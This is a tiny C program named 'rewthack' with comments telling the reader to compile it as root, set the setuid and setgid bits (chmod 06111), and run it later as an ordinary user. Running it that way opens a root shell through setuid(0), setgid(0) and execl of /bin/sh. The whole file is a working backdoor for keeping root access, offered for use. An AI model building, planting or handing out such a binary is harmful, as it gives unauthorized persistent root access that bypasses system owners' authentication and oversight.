/*
rewthack

compile as root, with "cc (or gcc) -o rewthack rewthack.c"
chmod to 06111, still as root, with "chmod 06111 rewthack"
logout from rootshell, run the prog. as normal user with "./rewthack"
look who you are, if the shell does not show, run "echo $UID" :)
*/

#include <stdio.h>
main()
{
	setuid(0);
	setgid(0);
	execl("/bin/sh","-sh",NULL);
}

